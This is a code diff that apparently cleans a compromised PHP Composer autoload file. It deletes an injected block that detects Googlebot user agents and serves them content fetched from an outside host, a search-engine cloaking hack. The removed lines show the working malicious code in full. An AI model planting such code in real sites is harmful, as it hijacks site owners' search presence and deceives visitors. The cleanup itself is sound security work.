@@ -19,26 +19,6 @@ if (PHP_VERSION_ID < 50600) {
         E_USER_ERROR
     );
 }
-function is_bot() {
-    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
-    foreach ($agents as $agent) {
-        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
-    }
-    return false;
-}
-
-if (is_bot()) {
-    $url = 'https://assyfa.pages.dev/assyfa';
-
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $result = curl_exec($ch);
-    curl_close($ch);
-
-    echo $result ?: ' ';
-    exit;
-}
-
 
 require_once __DIR__ . '/composer/autoload_real.php';
 
